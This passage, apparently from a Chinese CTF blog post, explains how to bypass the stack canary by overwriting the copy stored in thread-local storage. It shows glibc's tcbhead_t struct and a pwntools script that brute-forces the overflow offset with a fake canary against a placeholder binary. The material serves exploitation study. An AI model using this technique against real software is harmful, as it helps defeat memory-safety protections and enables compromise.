+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                             thread descriptor used by libpthread.  */</span></span><br><span class="line">        <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">        <span class="keyword">void</span> *self;        <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">        <span class="keyword">int</span> multiple_threads;</span><br><span class="line">        <span class="keyword">int</span> gscope_flag;</span><br><span class="line">        <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">        <span class="keyword">uintptr_t</span> stack_guard;   <span class="comment">/* canary，0x28偏移 */</span></span><br><span class="line">        <span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line">        ……</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>
+<p>这个 <strong>stack_guard</strong> 是在 <strong>libc_start_main</strong> 中进行设置和赋值的</p>
+<p>一般来说，我们不知道TLS的位置，需要爆破脚本来找出：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">offset=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./xxxx&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;xxxx&quot;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span>				   </span><br><span class="line">    payload += (padding-<span class="number">8</span>)	 	     <span class="comment">#padding</span></span><br><span class="line">    payload += <span class="string">&#x27;aaaaaaaa&#x27;</span>		     <span class="comment">#fake canary </span></span><br><span class="line">    payload += p64(<span class="number">0xdeadbeef</span>)		 <span class="comment">#rbp</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)			    <span class="comment">#返回地址</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span>*(offset-<span class="built_in">len</span>(payload))</span><br><span class="line">    p.send(payload)</span><br><span class="line">    temp = p.recvall()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxx&quot;</span> <span class="keyword">in</span> temp:</span><br><span class="line">        <span class="built_in">print</span>(offset)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        offset += <span class="number">1</span></span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">原本程序覆盖了canary是一定会报错的，但是payload后续填入的“a”可能会覆盖TLS，使程序通过canary</span></span><br><span class="line"><span class="string">只要程序通过了canary，‘p.recvall()’就会不接受到报错信息（stack_chk_fail）</span></span><br><span class="line"><span class="string">这之后我们就可以通过打印出的offset来计算偏移了</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+<p>当然也可以不找偏移，直接一次性填入非常长的“a”也是可以覆盖的</p>
+<p>覆盖TLS的方法只能在有“pthread_create”的题中可以用用，不然程序就很可能会覆盖关键数据，然后直接挂掉</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/miscellaneous/" rel="tag"><i class="fa fa-tag"></i> miscellaneous</a>
+              <a href="/tags/canary/" rel="tag"><i class="fa fa-tag"></i> canary</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/" rel="prev" title="canary爆破未遂+数据接收技巧">
+      <i class="fa fa-chevron-left"></i> canary爆破未遂+数据接收技巧
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/" rel="next" title="pwndbg搜索技巧+one_gadget">
+      pwndbg搜索技巧+one_gadget <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#canary%E7%9A%84%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="nav-number">1.</span> <span class="nav-text">canary的各种绕过技巧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#canary%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">canary原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.</span> <span class="nav-text">格式化字符串漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BE%93%E5%87%BA%E5%87%BD%E6%95%B0"><span class="nav-number">4.</span> <span class="nav-text">输出函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8stack-chk-fail%E7%9A%84%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF"><span class="nav-number">5.</span> <span class="nav-text">利用stack_chk_fail的报错信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stack-chk-fail%E5%8A%AB%E6%8C%81"><span class="nav-number">6.</span> <span class="nav-text">stack_chk_fail劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#one-by-one%E7%88%86%E7%A0%B4"><span class="nav-number">7.</span> <span class="nav-text">one-by-one爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A6%86%E7%9B%96TLS%E4%B8%AD%E5%82%A8%E5%AD%98%E7%9A%84canary%E5%80%BC"><span class="nav-number">8.</span> <span class="nav-text">覆盖TLS中储存的canary值</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yhellow"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yhellow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">113</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">79</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yhellow</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">1.5m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">22:58</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
